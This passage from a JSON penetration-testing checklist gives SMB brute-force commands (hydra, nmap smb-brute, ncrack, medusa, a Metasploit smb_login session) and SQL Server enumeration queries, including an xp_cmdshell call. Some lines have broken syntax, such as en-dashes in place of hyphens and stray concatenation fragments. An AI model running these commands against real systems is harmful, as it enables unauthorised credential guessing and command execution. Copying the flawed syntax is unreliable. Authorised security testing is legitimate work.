          "hydra -L ${user_file} -P ${pass_file} ${target} smb",
          "Nmap smb-brute.nse",
          "ncrack –U ${user_file} -P ${pass_file} ${target} –p 445",
          "medusa -h ${target} -U ${user_file} -P ${pass_file} -M smbnt"
        ],
        "codeBlock": "\\tmsf> use auxiliary/scanner/smb/smb_login\r\n\\tmsf exploit (smb_login)>set rhosts 192.168.1.118\r\n\\tmsf exploit (smb_login)>set user_file /root/Desktop/user.txt\r\n\\tmsf exploit (smb_login)>set pass_file /root/Desktop/pass.txt\r\n\\tmsf exploit (smb_login)>set stop_on_success true\r\n\\tmsf exploit (smb_login)>exploit"
      }
    ]
  },
  {
    "name": "SQL Server",
    "items": [
      {
        "entry": "Check for default usernames and passwords",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for same username and password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Check for blank password",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Run bruteforce",
        "steps": [
          ""
        ],
        "codeBlock": ""
      },
      {
        "entry": "Standard enumeration commands:",
        "steps": [
          ""
        ],
        "codeBlock": "SELECT @@version' + \\\r\nEXEC xp_msver' + \\\r\nEXEC master .. xp_cmdshell \\'net user\\'' + \\\r\nSELECT HOST_ NAME()\r\nSELECT DB_ NAME()\r\nSELECT name FROM master .. sysdatabases;\r\nSELECT name FROM master .. syslogins\r\nSELECT name FROM master .. sysobjects WHERE Xtype= 'U'\r\nSELECT name FROM SyScolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable' )\r\nSELECT user_name()"
      }
    ]
  }
]